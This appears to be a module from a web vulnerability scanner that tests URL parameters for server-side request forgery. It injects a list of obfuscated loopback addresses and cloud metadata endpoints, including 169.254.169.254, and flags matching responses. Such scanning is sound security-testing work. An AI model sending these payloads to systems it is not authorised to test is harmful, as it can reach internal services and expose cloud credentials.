import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:443",
    "http://localhost:80",
    "http://[::1]:80",
    "http://0.0.0.0:80",
    "http://0:80",
    "http://0x7f000001:80",
    "http://2130706433:80",
    "http://0177.0.0.1:80",
    "http://127.1:80",
    "http://0:80",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://100.100.100.200/latest/meta-data/",
]


class SsrfVariantsCheck(BaseCheck):
    name = "active_ssrf_variants"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for param in target_params:
                for payload in SSRF_PAYLOADS:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        if resp.status_code == 200 and ("root" in resp.text or "localhost" in resp.text or "meta-data" in resp.text):
                            results.append(CheckResult(
                                triggered=True,
                                severity="high",
                                title="SSRF variant detected",
                                description=f"Parameter '{param}' may be vulnerable to SSRF.",
                                evidence=f"Payload: {payload}\nStatus: {resp.status_code}",
                                remediation="Validate and restrict outbound URLs. Block access to internal IP ranges.",
                                cwe="CWE-918",
                            ))
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import copy
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
